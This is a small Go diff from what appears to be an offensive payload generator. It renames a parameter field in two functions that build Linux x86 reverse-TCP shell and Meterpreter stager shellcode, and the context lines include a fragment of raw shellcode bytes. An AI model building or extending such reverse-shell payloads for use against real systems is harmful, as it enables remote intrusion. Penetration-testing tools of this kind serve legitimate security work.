@@ -14,7 +14,7 @@ func init() {
 func reverse_tcp_shell_linux_intel_32(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
-	ip := params.Ip
+	ip := params.IP
 
 	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
 	//will need to put resume execution shellcode here
@@ -46,7 +46,7 @@ func reverse_tcp_shell_linux_intel_32(params api.Parameters) ([]byte, error) {
 func reverse_tcp_stager_linux_intel_32(params api.Parameters) ([]byte, error) {
 	port := params.Port
 	entry := params.Entry
-	ip := params.Ip
+	ip := params.IP
 
 	/*
 	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
